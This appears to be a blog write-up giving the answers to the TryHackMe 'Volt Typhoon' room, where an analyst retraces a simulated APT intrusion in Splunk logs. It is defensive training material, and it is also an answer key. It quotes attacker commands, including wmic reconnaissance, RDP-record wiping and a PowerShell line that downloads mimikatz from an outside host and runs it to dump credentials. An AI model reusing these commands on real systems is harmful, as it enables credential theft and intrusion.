---
title: TryHackMe-VoltTyphoon
date: 2026-09-28 09:31:16 +0700
categories: [TryHackMe]
tags: [tryhackme, splunk] # TAG names should always be lowercase
media_subpath: /assets/img/2026-09-28-TryHackMe_VoltTyphoon/
toc: true
comments: false
---
# Volt Typhoon

**Scenario**: The SOC has detected suspicious activity indicative of an advanced persistent threat (APT) group known as Volt Typhoon, notorious for targeting high-value organizations. Assume the role of a security analyst and investigate the intrusion by retracing the attacker's steps.  
  
You have been provided with various log types from a two-week time frame during which the suspected attack occurred. Your ability to research the suspected APT and understand how they maneuver through targeted networks will prove to be just as important as your Splunk skills.

---
# Initial Access
### Comb through the ADSelfService Plus logs to begin retracing the attacker’s steps. At what time (ISO 8601 format) was Dean's password changed and their account taken over by the attacker?
![image.png](image.png)
-> Answer : 2024-03-24T11:10:22

### Shortly after Dean's account was compromised, the attacker created a new administrator account. What is the name of the new account that was created?
![image 1.png](image%201.png)
-> Answer : voltyp-admin

---
# Execution
### In an information gathering attempt, what command does the attacker run to find information about local drives on server01 & server02?
![image 2.png](image%202.png)
-> Answer : wmic /node:server01, server02 logicaldisk get caption, filesystem, freespace, size, volumename

### The attacker uses ntdsutil to create a copy of the AD database. After moving the file to a web server, the attacker compresses the database. What password does the attacker set on the archive?
![image 3.png](image%203.png)
![image 4.png](image%204.png)
-> Answer : d5ag0nm@5t3r

---
# Persistence
### To establish persistence on the compromised server, the attacker created a web shell using base64 encoded text. In which directory was the web shell placed?
![image 5.png](image%205.png)
-> Answer : C:\Windows\Temp

---
# Defense Evasion
### In an attempt to begin covering their tracks, the attackers remove evidence of the compromise. They first start by wiping RDP records. What PowerShell cmdlet does the attacker use to remove the “Most Recently Used” record?
![image 6.png](image%206.png)
-> Answer : Remove-ItemProperty

### The APT continues to cover their tracks by renaming and changing the extension of the previously created archive. What is the file name (with extension) created by the attackers?
![image 7.png](image%207.png)
-> Answer : cl64.gif

### Under what regedit path does the attacker check for evidence of a virtualized environment?
![image 8.png](image%208.png)
-> Answer : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control

---
# Credential Access
### Using reg query, Volt Typhoon hunts for opportunities to find useful credentials. What three pieces of software do they investigate?  
Answer Format: Alphabetical order separated by a comma and space.
![image 9.png](image%209.png)
-> OpenSSH, putty, realvnc

### What is the full decoded command the attacker uses to download and run mimikatz?
![image 10.png](image%2010.png)
![image 11.png](image%2011.png)
-> Answer : Invoke-WebRequest -Uri "http://voltyp.com/3/tlz/mimikatz.exe" -OutFile "C:\Temp\db2\mimikatz.exe"; Start-Process -FilePath "C:\Temp\db2\mimikatz.exe" -ArgumentList @("sekurlsa::minidump lsass.dmp", "exit") -NoNewWindow -Wait